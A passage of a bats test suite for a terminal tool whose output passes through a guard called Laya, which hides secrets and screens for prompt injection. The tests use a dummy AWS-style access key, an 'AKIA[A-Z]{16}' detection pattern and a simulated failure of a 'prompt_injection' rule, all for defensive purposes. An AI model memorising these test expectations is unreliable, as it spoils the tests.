    run "$TERMINAL" send --enter -- 'true'
    [ "$status" -eq 3 ]
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 3 ]
    sleep 1
    [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --enter -- 'stty echo'
    [ "$status" -eq 0 ]
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" run -- 'echo back'
    [ "$status" -eq 0 ]
    [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
}

# Laya 3
@test "run holds an AKIA line and keeps the lines around it" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'printf "a\nAKIAABCDEFGHIJKLMNOP\nb\n"'
    [ "$status" -eq 0 ]
    [ "$output" = $'run=1\na\n[held by laya: secret]\nb\nlaya: held 1 lines\nexit=0' ]
}

# Laya 4
@test "read and wait --pattern use the guarded text" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo visible-marker; echo two; echo three; echo AKIAABCDEFGHIJKLMNOP' >/dev/null
    run "$TERMINAL" wait --timeout 5 --pattern 'visible-marker'
    [ "$status" -eq 0 ]
    run "$TERMINAL" wait --timeout 2 --pattern 'AKIA[A-Z]{16}'
    [ "$status" -eq 1 ]
    run "$TERMINAL" read
    [ "$status" -eq 0 ]
    [[ "$output" == *'visible-marker'* ]] || false
    [[ "$output" == *'[held by laya: secret]'* ]] || false
    [[ "$output" != *'AKIAABCDEFGHIJKLMNOP'* ]] || false
}

@test "run holds all output and exits 6 when the guard fails, and wait --run gives it later" {
    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo guard-marker'
    [ "$status" -eq 6 ]
    [[ "$output" == *$'output held: laya not available: use wait --run 1 again\nexit=0'* ]] || false
    [[ "$output" == *'laya not available: the output stays; use wait --run 1 when Laya answers'* ]] || false
    [[ "$output" != *'close and open'* ]] || false
    [[ "$output" != *'guard-marker'* ]] || false
    # The run keeps the lock: no new run deletes the held output.
    [ -d "$(companion_dir)/busy" ]
    run "$TERMINAL" read
    [ "$status" -eq 6 ]
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 5 ]
    [ "$output" = 'the output of run 1 is held: use wait --run 1 first' ]
    set_fake_laya '{}'
    run "$TERMINAL" wait --run 1
    [ "$status" -eq 0 ]
    [ "$output" = $'guard-marker\nexit=0' ]
    [ ! -d "$(companion_dir)/busy" ]
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 0 ]
}

@test "wait --run on an older run does not free the lock of a run that continues" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 0 ]
    run "$TERMINAL" run --timeout 1 -- 'sleep 6'
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 2 --run 1
    [ "$status" -eq 0 ]
    [ -d "$(companion_dir)/busy" ]
    run "$TERMINAL" run -- 'echo late'
    [ "$status" -eq 5 ]
    run "$TERMINAL" wait --timeout 10 --run 2
    [ "$status" -eq 0 ]
}

@test "the guard gets at most the last 32768 bytes of the output" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'head -c 300000 /dev/zero | tr "\0" a; echo; echo last-line'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'output cut: the last 32768 bytes\n'* ]] || false
    [[ "$output" == *$'last-line\nexit=0' ]] || false
    [ "${#output}" -lt 34000 ]
}

@test "laya status names the server of this companion" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" laya status
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nserver=external health=ok' ]] || false
    stop_fake_laya
    run "$TERMINAL" laya status
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nserver=external health=failed' ]] || false
}
